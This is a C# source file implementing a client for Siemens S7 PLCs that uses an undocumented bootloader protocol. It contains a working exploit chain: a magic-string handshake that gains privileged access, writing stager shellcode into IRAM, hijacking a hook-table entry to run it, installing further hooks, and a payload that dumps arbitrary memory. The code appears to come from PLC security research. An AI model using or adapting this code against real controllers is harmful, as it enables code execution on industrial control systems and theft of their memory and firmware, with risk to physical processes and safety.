using System;
using S7.Net.Interfaces;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Linq;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace S7.Net
{
    /// <summary>
    /// The main client for communicating with Siemens S7 PLCs using the undocumented bootloader protocol.
    /// Provides methods for handshake, stager installation, memory operations, and payload management.
    /// </summary>
    public sealed class PlcClient(ICommunicationChannel channel, Action<string> logger)
    {
        private readonly ICommunicationChannel _channel = channel ?? throw new ArgumentNullException(nameof(channel));
        private readonly PlcProtocol _protocol = new(channel ?? throw new ArgumentNullException(nameof(channel)),
                                                     logger ?? throw new ArgumentNullException(nameof(logger)));
        private readonly Action<string> _log = logger ?? throw new ArgumentNullException(nameof(logger));
        private uint _nextPayloadLocation = PlcConstants.DUMPER_PAYLOAD_LOCATION;

        /// <summary>
        /// Indicates whether the client is connected to the PLC.
        /// </summary>
        public bool IsConnected => _channel.IsConnected;

        private byte[] GetBigEndianBytes(uint value)
        {
            var bytes = BitConverter.GetBytes(value);
            if (BitConverter.IsLittleEndian)
            {
                Array.Reverse(bytes);
            }
            return bytes;
        }

        /// <summary>
        /// Invokes a primary handler on the PLC.
        /// </summary>
        /// <param name="handlerIndex">The index of the handler to invoke.</param>
        /// <param name="args">The arguments to pass to the handler.</param>
        /// <param name="awaitResponse">Whether to wait for a response.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        /// <returns>The response from the PLC, or null if no response was awaited.</returns>
        public async Task<byte[]?> InvokePrimaryHandler(byte handlerIndex, byte[] args, bool awaitResponse = true, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            var payload = new byte[1 + args.Length];
            payload[0] = handlerIndex;
            Array.Copy(args, 0, payload, 1, args.Length);
            await _protocol.SendPacketAsync(payload, cancellationToken: cancellationToken);
            if (!awaitResponse) return null;
            try
            {
                return await _protocol.ReceivePacketAsync(cancellationToken);
            }
            catch (ChecksumMismatchException ex)
            {
                _log($"[ERROR] Checksum mismatch in response to handler 0x{handlerIndex:X2}: {ex.Message}");
                return null;
            }
        }

        #region Stager/Exploit Chain
        /// <summary>
        /// Performs the initial handshake to gain special access to the PLC.
        /// </summary>
        /// <param name="cancellationToken">The cancellation token.</param>
        /// <returns>True if the handshake was successful, false otherwise.</returns>
        public async Task<bool> PerformHandshakeAsync(CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log("Starting handshake...");
            byte[] magic = Encoding.ASCII.GetBytes("MFGT1");
            byte[] padding = Encoding.ASCII.GetBytes("AAAA");
            var handshakePayload = padding.Concat(magic).ToArray();

            for (int attempt = 0; attempt < 100; attempt++)
            {
                cancellationToken.ThrowIfCancellationRequested();
                await _protocol.RawWriteAsync(handshakePayload, 0, handshakePayload.Length, cancellationToken);
                var sw = Stopwatch.StartNew();
                var responseBuffer = new System.Collections.Generic.List<byte>();
                while (sw.ElapsedMilliseconds < 300)
                {
                    cancellationToken.ThrowIfCancellationRequested();
                    if (_protocol.DataAvailable)
                    {
                        var tmpBuf = new byte[256];
                        int bytesRead = await _protocol.RawReadAsync(tmpBuf, 0, tmpBuf.Length, cancellationToken);
                        if (bytesRead > 0)
                        {
                            responseBuffer.AddRange(tmpBuf.Take(bytesRead));
                            var ascii = Encoding.ASCII.GetString(responseBuffer.ToArray());
                            _log($"Handshake attempt {attempt + 1}: buf={BitConverter.ToString(responseBuffer.ToArray())} ASCII={ascii}");
                            if (ascii.Contains("-CPU"))
                            {
                                _log("Handshake successful: Found -CPU signature!");
                                return true;
                            }
                        }
                    }
                    await Task.Delay(50, cancellationToken);
                }
                // Final buffer check after silence
                if (responseBuffer.Count > 0)
                {
                    var ascii = Encoding.ASCII.GetString(responseBuffer.ToArray());
                    _log($"Handshake final buf={BitConverter.ToString(responseBuffer.ToArray())} ASCII={ascii}");
                    if (ascii.Contains("-CPU"))
                    {
                        _log("Handshake successful (after silence): Found -CPU signature!");
                        return true;
                    }
                }
                await Task.Delay(10, cancellationToken); // brief pause before retry
            }
            _log("Handshake failed.");
            return false;
        }

        /// <summary>
        /// Gets the version of the PLC bootloader.
        /// </summary>
        /// <param name="cancellationToken">The cancellation token.</param>
        /// <returns>The version string.</returns>
        public async Task<string> GetVersion(CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log("Getting bootloader version...");
            var response = await InvokePrimaryHandler(0, Array.Empty<byte>(), true, cancellationToken);
            if (response is null) throw new Exception("Failed to get version.");
            _log($"[VERSION RAW HEX] {BitConverter.ToString(response)}");
            _log($"[VERSION RAW ASCII] {Encoding.ASCII.GetString(response)}");
            // Look for V as prefix, then take next three bytes
            int idxV = Array.IndexOf(response, (byte)'V');
            string version = "(invalid)";
            if (idxV >= 0 && response.Length >= idxV + 4)
            {
                version = $"V{response[idxV + 1]}.{response[idxV + 2]}.{response[idxV + 3]}";
            }
            else if (response.Length >= 6)
            {
                // fallback: manually use offset 2 as that's where V appears in typical bootloader
                version = $"{(char)response[2]}{response[3]}.{response[4]}.{response[5]}";
            }
            _log($"Got version: {version}");
            return version;
        }

        /// <summary>
        /// Enters a subprotocol mode.
        /// </summary>
        /// <param name="mode">The mode to enter.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        private async Task EnterSubprotocol(int mode, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log($"Entering subprotocol mode {mode}...");
            ushort magic = PlcConstants.SUBPROT_80_MODE_MAGICS[mode];
            byte[] payload = BitConverter.GetBytes(magic);
            if (BitConverter.IsLittleEndian) Array.Reverse(payload); // Make big-endian
            var response = await InvokePrimaryHandler(0x80, payload, true, cancellationToken);
            if (response == null || !response.SequenceEqual(PlcConstants.ANSW_ENTER_SUBPROTO_SUCCESS))
                throw new Exception("Failed to enter subprotocol.");
            _log("Entered subprotocol successfully.");
        }

        /// <summary>
        /// Leaves the current subprotocol mode.
        /// </summary>
        private async Task LeaveSubprotocol(CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log("Leaving subprotocol...");
            await _protocol.SendPacketAsync(new byte[] { 0x81, 0xD0, 0x67 }, cancellationToken: cancellationToken);
            try
            {
                await _protocol.ReceivePacketAsync(cancellationToken);
            }
            catch (ChecksumMismatchException ex)
            {
                _log($"[ERROR] Checksum mismatch while leaving subprotocol: {ex.Message}");
            }
        }

        /// <summary>
        /// Writes data to the PLC in subprotocol mode.
        /// </summary>
        /// <param name="address">The address to write to.</param>
        /// <param name="data">The data to write.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        private async Task RawSubprotocolWrite(uint address, byte[] data, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            var payload = new byte[7 + data.Length];
            payload[0] = 0x84;
            payload[1] = 0x5a;
            payload[2] = 0x2e;
            var addrBytes = GetBigEndianBytes(address);
            Array.Copy(addrBytes, 0, payload, 3, 4);
            Array.Copy(data, 0, payload, 7, data.Length);

            await _protocol.SendPacketAsync(payload, cancellationToken: cancellationToken);
            try
            {
                await _protocol.ReceivePacketAsync(cancellationToken);
            }
            catch (ChecksumMismatchException ex)
            {
                _log($"[ERROR] Checksum mismatch in response to RawSubprotocolWrite: {ex.Message}");
            }
        }

        /// <summary>
        /// Writes a chunk of data to IRAM.
        /// </summary>
        /// <param name="targetAddress">The target address in IRAM.</param>
        /// <param name="contents">The data to write.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        private async Task WriteChunkToIram(uint targetAddress, byte[] contents, CancellationToken cancellationToken = default)
        {
            uint targetArgument = targetAddress - 0x10000000;
            // 1. Mask with 0xFF bytes
            await RawSubprotocolWrite(targetArgument, Enumerable.Repeat((byte)0xFF, contents.Length).ToArray(), cancellationToken);
            // 2. Write actual contents
            await RawSubprotocolWrite(targetArgument, contents, cancellationToken);
        }

        /// <summary>
        /// Writes data to IRAM.
        /// </summary>
        /// <param name="targetAddress">The target address in IRAM.</param>
        /// <param name="contents">The data to write.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        public async Task WriteToIram(uint targetAddress, byte[] contents, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log($"Writing {contents.Length} bytes to IRAM at 0x{targetAddress:X8}");
            await EnterSubprotocol(PlcConstants.SUBPROT_80_MODE_IRAM, cancellationToken);

            int chunkSize = 16; // From python script
            for (int i = 0; i < contents.Length; i += chunkSize)
            {
                cancellationToken.ThrowIfCancellationRequested();
                int size = Math.Min(chunkSize, contents.Length - i);
                var chunk = new byte[size];
                Array.Copy(contents, i, chunk, 0, size);
                _log($"Writing chunk {i / chunkSize + 1}...");
                await WriteChunkToIram(targetAddress + (uint)i, chunk, cancellationToken);
            }

            await LeaveSubprotocol(cancellationToken);
            _log("Finished writing to IRAM.");
        }

        /// <summary>
        /// Installs the stager payload onto the PLC.
        /// </summary>
        /// <param name="stagerPayload">The stager payload to install.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        public async Task InstallStager(byte[] stagerPayload, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            _log("Starting stager installation...");
            // 1. Write stager shellcode to its location in IRAM
            await WriteToIram(PlcConstants.IRAM_STAGER_START, stagerPayload, cancellationToken);

            // 2. Overwrite an entry in the hook table to point to our stager
            _log("Overwriting hook table entry...");
            var hookEntryPayload = new byte[6];
            hookEntryPayload[0] = 0x00; // Arg length check part 1
            hookEntryPayload[1] = 0xFF; // Arg length check part 2 (0x00FF = variable length)

            // Pointer to the stager code (big-endian)
            var addrBytes = GetBigEndianBytes(PlcConstants.IRAM_STAGER_START);
            Array.Copy(addrBytes, 0, hookEntryPayload, 2, 4);

            await WriteToIram(PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);

            _log("Stager installation complete.");
            _log($"[PROTOCOL] ✅ Stager installed at hook index 0x{PlcConstants.DEFAULT_STAGER_ADDHOOK_IND:X2}");
            _log($"[PROTOCOL] Hook table address: 0x{PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2:X8}");
            _log($"[PROTOCOL] Stager code address: 0x{PlcConstants.IRAM_STAGER_START:X8}");
            _log("[PROTOCOL] 🎯 Stager is ready for use");
        }
        #endregion

        #region Stager Communication
        /// <summary>
        /// Encodes a packet for transmission via the stager.
        /// </summary>
        /// <param name="chunk">The chunk to encode.</param>
        /// <returns>The encoded packet.</returns>
        private byte[] EncodePacketForStager(byte[] chunk)
        {
            for (int i = 1; i < 256; i++)
            {
                byte key = (byte)i;
                bool keyInChunk = chunk.Contains(key);
                bool keyIsLength = (key == chunk.Length + 2);
                if (!keyInChunk && !keyIsLength)
                {
                    var encoded = new byte[chunk.Length + 1];
                    encoded[0] = key;
                    for (int j = 0; j < chunk.Length; j++)
                    {
                        encoded[j + 1] = (byte)(chunk[j] ^ key);
                    }
                    return encoded;
                }
            }
            throw new Exception("Could not find a suitable XOR key to encode chunk.");
        }

        /// <summary>
        /// Sends a full message via the stager.
        /// </summary>
        /// <param name="msg">The message to send.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        // The maxChunkSize (189) and the call to SendPacketAsync with a step of 8 and
        // a sleep of 10ms are consistent with the Python client's
        // `send_full_msg_via_stager` and `write_via_stager` functions.
        public async Task SendFullMsgViaStager(byte[] msg, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            int maxChunkSize = PlcConstants.MAX_MSG_LEN - 1;
            for (int i = 0; i < msg.Length; i += maxChunkSize)
            {
                cancellationToken.ThrowIfCancellationRequested();
                // Add safety delay between chunks (matches Python SEND_REQ_SAFETY_SLEEP_AMT)
                await Task.Delay(10, cancellationToken);

                int size = Math.Min(maxChunkSize, msg.Length - i);
                var chunk = new byte[size];
                Array.Copy(msg, i, chunk, 0, size);

                _log($"[BYTES] Send progress: 0x{i:X6}/0x{msg.Length:X6} ({(float)i / msg.Length:P2})");
                var encoded = EncodePacketForStager(chunk);
                _log($"[BYTES] Encoded chunk (with XOR key): {BitConverter.ToString(encoded)}");
                await _protocol.SendPacketAsync(encoded, 8, 10, cancellationToken);
                _log($"[BYTES] Chunk sent at offset {i}. Awaiting ACK...");

                byte[]? ack = null;
                try
                {
                    ack = await _protocol.ReceivePacketAsync(cancellationToken);
                }
                catch (ChecksumMismatchException ex)
                {
                    _log($"[ERROR] Checksum mismatch while waiting for ACK from stager: {ex.Message}");
                    throw;
                }
                if (ack == null || ack.Length != 1)
                {
                    _log($"[BYTES][ERROR] Expected single-byte ACK, got: {(ack != null ? BitConverter.ToString(ack) : "<null>")}");
                    throw new Exception($"Did not receive expected empty ACK from stager at chunk offset {i}");
                }

                byte ackValue = ack[0];
                _log($"[BYTES][ACK] Value received: 0x{ackValue:X2}");
                if (ackValue == 0xFF)
                {
                    _log("[BYTES][WARNING] Received interrupt ACK (0xFF). Aborting.");
                    throw new Exception("Interrupt ACK (0xFF)");
                }
            }
            // Send empty packet to signify end of transmission
            var endPacket = EncodePacketForStager(Array.Empty<byte>());
            _log($"[BYTES] Sending end packet: {BitConverter.ToString(endPacket)}");
            await _protocol.SendPacketAsync(endPacket, cancellationToken: cancellationToken);
            byte[]? finalAck = null;
            try
            {
                finalAck = await _protocol.ReceivePacketAsync(cancellationToken);
            }
            catch (ChecksumMismatchException ex)
            {
                _log($"[ERROR] Checksum mismatch while waiting for final ACK from stager: {ex.Message}");
            }
            _log($"[BYTES] Received end packet ACK (length={finalAck?.Length ?? -1}): {(finalAck != null ? BitConverter.ToString(finalAck) : "<null>")}");
        }

        /// <summary>
        /// Invokes an additional hook on the PLC.
        /// </summary>
        /// <param name="hookNo">The hook number to invoke.</param>
        /// <param name="args">The arguments to pass to the hook.</param>
        /// <param name="awaitResponse">Whether to wait for a response.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        /// <returns>The response from the PLC, or null if no response was awaited.</returns>
        public async Task<byte[]?> InvokeAddHook(int hookNo, byte[] args, bool awaitResponse = true, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            if (hookNo < 0 || hookNo > 0x20)
                throw new ArgumentOutOfRangeException(nameof(hookNo));

            var payload = new byte[1 + args.Length];
            payload[0] = (byte)hookNo;
            Array.Copy(args, 0, payload, 1, args.Length);

            return await InvokePrimaryHandler(0x1c, payload, awaitResponse, cancellationToken);
        }

        /// <summary>
        /// Writes data to the PLC via the stager.
        /// </summary>
        /// <param name="address">The address to write to.</param>
        /// <param name="contents">The data to write.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        public async Task WriteViaStager(uint address, byte[] contents, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            var addressBytes = GetBigEndianBytes(address);
            await InvokeAddHook(PlcConstants.DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false, cancellationToken);
            await SendFullMsgViaStager(contents, cancellationToken);
        }

        /// <summary>
        /// Installs an additional hook via the stager.
        /// </summary>
        /// <param name="targetAddress">The target address of the new hook.</param>
        /// <param name="payload">The payload of the new hook.</param>
        /// <param name="newHookNo">The new hook number.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        public async Task InstallAddHookViaStager(uint targetAddress, byte[] payload, int newHookNo, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            // Set up function pointer and disable arbitrary argument length check
            var hookEntry = new byte[8];
            hookEntry[3] = 0xff; // Variable length
            hookEntry[4] = (byte)(targetAddress >> 24);
            hookEntry[5] = (byte)(targetAddress >> 16);
            hookEntry[6] = (byte)(targetAddress >> 8);
            hookEntry[7] = (byte)targetAddress;
            await WriteViaStager(PlcConstants.ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry, cancellationToken);

            // Write the code of the handler itself
            await WriteViaStager(targetAddress, payload, cancellationToken);
        }

        /// <summary>
        /// Receives a large amount of data from the PLC.
        /// </summary>
        /// <param name="progress">The progress reporter.</param>
        /// <param name="cancellationToken">The cancellation token.</param>
        /// <returns>The received data.</returns>
        public async Task<byte[]> ReceiveMany(IProgress<long> progress, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");
            using (var ms = new MemoryStream())
            {
                while (true)
                {
                    cancellationToken.ThrowIfCancellationRequested();
                    byte[]? chunk = null;
                    try
                    {
                        chunk = await _protocol.ReceivePacketAsync(cancellationToken);
                    }
                    catch (ChecksumMismatchException ex)
                    {
                        _log($"[ERROR] Checksum mismatch during ReceiveMany: {ex.Message}");
                        // Optionally, we could break or rethrow here depending on desired behavior.
                        // For now, we'll just log and continue, which might result in incomplete data.
                        continue;
                    }
                    if (chunk == null || chunk.Length == 0)
                    {
                        break;
                    }
                    await ms.WriteAsync(chunk, 0, chunk.Length, cancellationToken);
                    progress?.Report(ms.Length);
                }
                return ms.ToArray();
            }
        }

        public async Task<byte[]> DumpMemoryAsync(uint address, uint length, byte[] dumpMemPayload, IProgress<long> progress, CancellationToken cancellationToken = default)
        {
            if (_protocol is null) throw new InvalidOperationException("Not connected.");

            _log("Installing memory dumper payload...");
            await InstallAddHookViaStager(_nextPayloadLocation, dumpMemPayload, PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND, cancellationToken);
            _nextPayloadLocation += (uint)dumpMemPayload.Length;
            // Align to next 4-byte boundary
            if (_nextPayloadLocation % 4 != 0)
            {
                _nextPayloadLocation = _nextPayloadLocation - (_nextPayloadLocation % 4) + 4;
            }
            _log("Memory dumper payload installed.");

            _log($"Requesting memory dump of {length} bytes from 0x{address:X8}...");
            // Prepare arguments: "A" + address + length
            var args = new byte[1 + 4 + 4];
            args[0] = (byte)'A';
            var addrBytes = GetBigEndianBytes(address);
            var lenBytes = GetBigEndianBytes(length);
            Array.Copy(addrBytes, 0, args, 1, 4);
            Array.Copy(lenBytes, 0, args, 5, 4);

            var response = await InvokeAddHook(PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND, args, true, cancellationToken);

            if (response == null || !Encoding.ASCII.GetString(response).TrimEnd('\0').StartsWith("Ok"))
            {
                var responseStr = response != null ? BitConverter.ToString(response) : "<null>";
                throw new Exception($"Failed to start memory dump. Unexpected response: {responseStr}");
            }

            _log("Memory dump started. Receiving data...");
            var data = await ReceiveMany(progress, cancellationToken);
            _log($"Memory dump complete. Received {data.Length} bytes.");
            return data;
        }
        #endregion
    }
}
